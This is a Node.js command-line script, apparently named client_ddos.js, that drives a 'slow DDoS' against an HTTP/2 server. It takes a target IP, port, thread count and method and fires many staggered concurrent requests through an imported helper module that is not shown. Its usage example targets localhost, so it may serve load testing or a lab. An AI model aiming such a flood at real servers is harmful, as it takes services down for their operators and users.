const http2 = require('http2');
const Http2Request = require('./http2request');

/**
 * @argument {string} ip
 * @argument {number } port
 * @argument {number} numberOfRequests
 * @argument {number }numberOfThreads
 * @argument {string} httpMethod
 * Main function initialize the previous variables with command line arguments.
 * It also initialize the Http2Request object with the requested values, then it checks the type of method:
 * if it is post it creates N threads that make that request with the promise mechanism, then set a timeout to
 * make the slow ddos. After all, it waits for the completion of all the promises
 * This code is repeated for each http Method.
 *  */
  async function main() {
    try{
      if(process.argv.length!=7){//also node and file.js are counted as arguments
        console.log("Insert ip - port - number of requests - number of threads - Http2 Method ");
        console.log("An example of utilization could be:");
        console.log("node client_ddos.js localhost 8000 20 1000 POST");
        process.exit(1);
      }
      const [ip, port, numberOfRequests,numberOfThreads,httpMethod] = process.argv.slice(2);
      const http2Request= new Http2Request(ip,port,numberOfRequests);

      console.log("   \n",ip," ",port," ",numberOfRequests," ",numberOfThreads," ",httpMethod);
      const promises = [];

      switch(httpMethod.toUpperCase()){
        case("POST"):
            for (let i = 0; i < numberOfThreads; i++) {
              promises.push(http2Request.makeRequestPost(i));
              await new Promise(resolve => setTimeout(resolve, 100));

            }
            await Promise.all(promises);

            break;

        case("GET"):
            for (let i = 0; i < numberOfThreads; i++) {
             promises.push(http2Request.makeRequestGet(i));
             await new Promise(resolve => setTimeout(resolve, 100));

            }
            await Promise.all(promises);

            break;

        case("PUT"):
            for (let i = 0; i < numberOfThreads; i++) {
              promises.push(http2Request.makeRequestPut(i));
              await new Promise(resolve => setTimeout(resolve, 100));

            }
            await Promise.all(promises);

            break;


        case("DELETE"):
            for (let i = 0; i < numberOfThreads; i++) {
              promises.push(http2Request.makeRequestDelete(i));
              await new Promise(resolve => setTimeout(resolve, 100));

            }
            await Promise.all(promises);

            break;

            default:
              console.log("Insert a valid http2 method: POST - GET - DELETE - PUT");
              process.exit(1);



      }
   }
   catch(error){
      console.error(error.message);

     }
  }

  
  main();